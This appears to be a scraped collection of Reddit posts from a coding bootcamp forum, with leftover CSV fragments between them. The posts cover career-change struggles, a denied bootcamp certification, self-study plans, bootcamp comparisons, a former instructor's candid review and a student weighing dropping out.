Fast forward two years, after sending out nearly 600+ applications for a myriad of jobs, I couldn't get anything. A friend told me about coding, so I took a stab at studying for it by myself. Fell surprisingly in love with the complexity of it all, so I decided to pursue it. So? I joined a coding bootcamp.

Still living at home, things started getting rough. My house eventually became an abusive environment. It was hard for me to focus, let alone get the most simple of tasks done while at the bootcamp.

Four months later, I graduate the coding bootcamp, with one barely finished project and barely anything to show for it. Well... aside from being now 20k in debt.

I tried my hand at getting jobs in coding while self-teaching but it became rough. Eventually during a luck-of-the-draw interview, the interviewee ended up telling me how she only interviewed me because of my ""cover letter"" and because ""i wrote well"". She inquired why I wasn't going for something like UX design and told me I should pursue it because of my ability to write well and have an eye for design.

So, I started self-teaching UX/UI Design. Spent months working on building up a single passion project and starting applying for jobs in that realm. Still radio silence.

During this time, things at my home became violent, so I decided to up and leave and move in with my partner.

Ever since moving in with my partner, I've tried figuring out what to do.

I've tried pursuing software development, but barely remember anything from the course due to family issues/trauma. I enjoyed what I did, but I'm unsure of whether it'd be something feasible to consider knowing I'll have to try and find a place of my own in six months. And well, after taking a look at the r/learnprogramming and r/cscareerquestions subreddit, it seems like it takes more than a year for most self-study programmers to land a job.

I've been studying myself coding for the last 10 months, mainly with Udemy and freeCodeCamp, and because I feel like I need some review and proper feedback on my work and especially with JS I am looking for a Bootcamp.  
what I mainly look for is a remote Bootcamp (not in the US timezone), up to 6 months that can help me as well understand how to find a job in the industry as a freelance (Nomad life..) and maybe as well how to do interviews and get a job that isn't freelance.  
it is important for me that the instructors that help me are people who actually have some experience and not just people who finish the Bootcamp and now practice their knowledge.  
as almost everyone here I'm on a budget but ill just look into what you recommend and see if it might be a fit.  
\- I had a look at Freemote and at the moment I reckon this is the fittest to what I want mainly because of the code review and the preparation to freelance work, but I will want to know more than Shopify development in the future, but it might be a good place to start. if you have any idea if I should or shouldn't do it I appreciate the feedback!

codingbootcamp,"I signed up for the data analytics Bootcamp earlier this year. Started in March of 2021 and it ended on 9/11/2021. I admit to procrastinating and submitted most of my homework the week before the program ended. I did speak to my professor and he said I was still able to submit them. There were two assignments that were submitted but still needed grading by the last class day. I contacted my professor and TA and they were finally graded 9/16. Once they were graded my professor told me to email my SSM(student success manager) to verify that I’m all clear to receive my certification. I finished the program with an A. The SSM let me know the homework I submitted late was for my own benefit and wouldn’t count towards completion which confused me. I sent her a screenshot of what my professor sent me and she apologized and then set up a meeting with the university to get an exception. It’s been a couple of days and just now received notice that the university denied the exception because “turning in homework so late posed a danger to the University.  The bottom line is that the University has denied our requests to make an exception for you, because it would impact the program and potentially impact all future students.” My professor apologized profusely today and offered to write me a letter of recommendation for any job I choose to apply to in the future.
Btw this is through Trilogy at my local university. I’m so mad at myself. If anyone has any experience, advice would be greatly appreciated.

codingbootcamp,"So, I can't afford a bootcamp and I need to learn coding (both as a hobby and for work). I have no plans of becoming a full time developer, but since I have to work actively with tech teams and I like coding, I feel having a good understanding of front and backend development would help.

The reason behind looking at bootcamps were because I really need a push + clear timelines to keep me motivated. However, the cost is really demotivating me :(

So here's what I plan to do:

Time in hand: 6-9 months. (1-3 hours everyday)

Courses planning to cover:
1. Start with Colt Steele Web Developer Bootcamp to get a good understanding at a high level. (2 months)
2. Dive into Jonas JavaScript course (1.5 months)
3. Learn a bit of SQL and NoSqL (1 month) &lt;We use NoSQL&gt;
4. Dabble in Node JS (1.5 months)

Keep a month or two as buffer in case I need more time.

What do you think do this plan? Should I learn something else also? Is there any cheap bootcamp with clear deadlines? I know Udemy's is the cheapest but any suggestions are welcome.",Can't afford bootcamp. Here's my plan.,"So, I can't afford a bootcamp and I need to learn coding (both as a hobby and for work).

codingbootcamp,"Hi,

I am currently in school for my general Associates degree and I am looking into signing up with a coding bootcamp. The reason why is because I work retail and I am very tired of working customer service and sales. I have always had a passion for technology and always wanted to get into coding but don't exactly know where to start. I was referred to look up coding bootcamps but I also want to make sure I am not going to waste my money.  Out of my research I have been doing the top 3 boot camps that have caught my eye are the Coding Dojo, The Tech Academy, and App Academy. But ideally  I am most interested in the Coding Dojo because of their curriculum. On their website it shows they go over the basic web development languages like HTML CSS but also goes into Python, Java, and C# and java script. Which is what truly caught my eye as that most of the other academy's curriculum doesnt really touch base on java or c#. I would like to know what your honest thoughts are and if you went to any of these bootcamps what your experience was?

codingbootcamp,"I went through the online program and immediately afterward taught there for 6 months. 

Ask me anything and I'll be brutally honest. 

My personal opinion though, if you don't want to ask something specific, is that its not worth it. Or at least it definitely isn't now. I definitely think it's overpriced for what you actually get out of it. 

So here are some key points.... 

1: they used to have senior devs teaching. That's not the case anymore. a/A Graduates teach it now. 

2: If you get a job it's because you worked hard, not because they gave you some secret sauce. 

3: As a student I had a pretty good time. It was fun and my lead instructor was amazing. 

4: As an instructor they've started taking in more students than I think they should. I mean I had to somehow help over 100 people during module one. I mean I wasn't alone in helping... But our team was super small. They suffered from that. Like week two assessment was notorious for failing 20+ students every time. 

5: it's pretty easy to get kicked out. They have a pretty intense expectation for punctuality. You're permitted 10 strikes before you're removed and have to pay for the course without their ""job search help"". You get strikes by being more than 5 minutes late for a checkin which must be done three times a day, and missing a nightly report. I advocated so hard as an instructor for not making those reports mandatory. Made me sad to see people get kicked out over that. Definitely heart breaking from the instructors side.

6: The instructors are great people. Seriously they try really really hard to make up for the fact that they're understaffed. Please be nice to them if you go. 

7: I did get a job. But I didn't have job search help. More because I didn't need it as I had buddies in the industry that put me in touch with recruiters and management.

codingbootcamp,"Over the last year, I took TONS of coding workshops/classes (including a part-time, 60 hour front end web development course) to help me decide whether or not I should pursue a career change. I loved the majority of the coding classes, received good feedback from instructors / people in the field, so I decided to attend a full-time program after no less than 6 months of researching and self-teaching. I was accepted into reputable bootcamp this summer and have been in it for 1 week and 1 day. Already, I am beginning to question whether I made the right decision and I'd love other folks' feedback on whether or not I should potentially just bag this and get most of my money back. Everyone in my personal life is ""RAH RAH RAH RAH, GO FOR IT"" so I'd love some actual, honest feedback from people who have been in my shoes as a bootcamp student. 

Here's the two reasons I'm considering dropping out:   
\+ I have major challenges with Javascript and I am not sure I can overcome these challenges. I understand the basic concepts, I can write out basic functions and loops, I can manipulate the DOM if I have cheatsheets and can visually see the page, but I question whether or not I can get past this skill level. I am diagnosed with dyscalculia and have MAJOR challenges with writing out javascript syntax and logic, especially once it starts being 100+ lines of code. It takes me twice as long as other people to figure out the order of a function and whether or not things are backwards or forwards, etc. We just started javascript classes today and I literally got everything mixed up, writing out the syntax completely backwards. I just feel like this early struggle with javascript might be a sign I'm doomed and my brain isn't right for this.

\+ I'm in a computer engineering/full stack development camp, but I am not really interested in a programming job, per se. I want to be a web designer or a front end web developer or a content manager. My bootcamp admissions person and I talked about me doing something with UX vs coding, but I took a  during my research period and it was SO BORING. I HATED it. That's why I went with coding vs UX - I LOVE, LOVE, LOVE CODING WHEN I GET DOWN TO IT. However, now that I'm in an engineering-type class, I really wonder if UX would have been a better fit. If so, why bother with a bootcamp that isn't really appropriate for what I want to do??? 

At this point, I have until the end of the month to drop out and save most of my money. We are going into our first project and my experience with it and grade on the project will probably determine my ultimate fate, but I'd love this subreddit's feedback. I just feel like such a loser for considering dropping out. I was so excited about this, but now I am not sure if this was the right decision for me. I can easily fall back on my old career, so it's not like this determines the rest of my life, but I just feel so conflicted and would love some feedback from people.
